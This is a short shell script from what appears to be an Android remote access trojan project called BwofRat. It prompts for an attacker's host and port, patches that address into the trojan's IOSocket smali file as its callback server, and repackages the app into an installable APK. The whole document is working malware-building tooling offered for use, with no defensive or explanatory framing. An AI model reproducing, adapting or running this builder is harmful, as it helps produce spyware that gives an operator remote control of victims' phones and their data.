#!/usr/bin/env sh

smaliFile="smali/com/thebwof/bwofrat/IOSocket.smali"

if [ -d $PREFIX/share/bwofrat -a -d $HOME/BwofRat ]; then
    echo "[!] You installed bwofrat by both TermuxBlack and Github so please remove anyone first"
    exit 1
elif [ -d $PREFIX/share/bwofrat ]; then
    appPath="$PREFIX/share/bwofrat/server/app/factory/decompiled"
else
    appPath="$HOME/BwofRat/server/app/factory/decompiled"
fi

read -p "[*] IP/URL/HOST : " host        
read -p "[*] PORT : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R "$appPath" -o ~/bwofrat/BwofRat.apk
